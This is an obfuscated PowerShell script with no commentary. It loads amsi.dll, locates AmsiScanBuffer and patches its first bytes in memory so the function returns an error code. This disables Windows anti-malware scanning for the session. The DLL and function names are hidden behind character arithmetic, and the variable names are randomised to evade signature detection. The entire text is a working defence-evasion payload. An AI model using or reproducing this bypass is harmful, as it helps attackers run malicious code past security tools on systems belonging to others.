$EXlx8AYGYvP = @"
using System;
using System.Runtime.InteropServices;
public class EXlx8AYGYvP {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr oOY2S, string cQIpC2WEuM4s);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr gq22IHItr96WtE, UIntPtr yNx7uOWgI88vcbpYp, uint TNRa6CylnG, out uint K6LPa5GR);
}
"@

Add-Type $EXlx8AYGYvP

$vOmVZoDCmVRI = [EXlx8AYGYvP]::LoadLibrary("$([Char]([BYTe]0x61)+[CHaR](53+56)+[cHAR](115+33-33)+[Char](105)+[ChaR]([byTE]0x2e)+[cHAr]([bYtE]0x64)+[ChaR](108+5-5)+[CHAr]([bYtE]0x6c))")
$YcD1btnc2Ikb4alob = [EXlx8AYGYvP]::GetProcAddress($vOmVZoDCmVRI, "$([cHaR]([byTe]0x41)+[CHaR](109+11-11)+[chAR]([BYtE]0x73)+[ChAr]([ByTE]0x69)+[chaR]([Byte]0x53)+[cHar]([byTE]0x63)+[CHAR](13+84)+[char](86+24)+[ChAR](13+53)+[ChAR]([bytE]0x75)+[CHAr](47+55)+[cHAr](102)+[chaR](101*46/46)+[chaR]([bytE]0x72))")
$p = 0
[EXlx8AYGYvP]::VirtualProtect($YcD1btnc2Ikb4alob, [uint32]5, 0x40, [ref]$p)
$sIjmU = "0xB8"
$pAzrTdW = "0x57"
$RVK = "0x00"
$hcfX4kyIaONTVDr1TJI = "0x07"
$_bH80ci6_g = "0x80"
$JGtNfm3NFnRjh_6vCfe = "0xC3"
$Cj5 = [Byte[]] ($sIjmU,$pAzrTdW,$RVK,$hcfX4kyIaONTVDr1TJI,+$_bH80ci6_g,+$JGtNfm3NFnRjh_6vCfe)
[System.Runtime.InteropServices.Marshal]::Copy($Cj5, 0, $YcD1btnc2Ikb4alob, 6)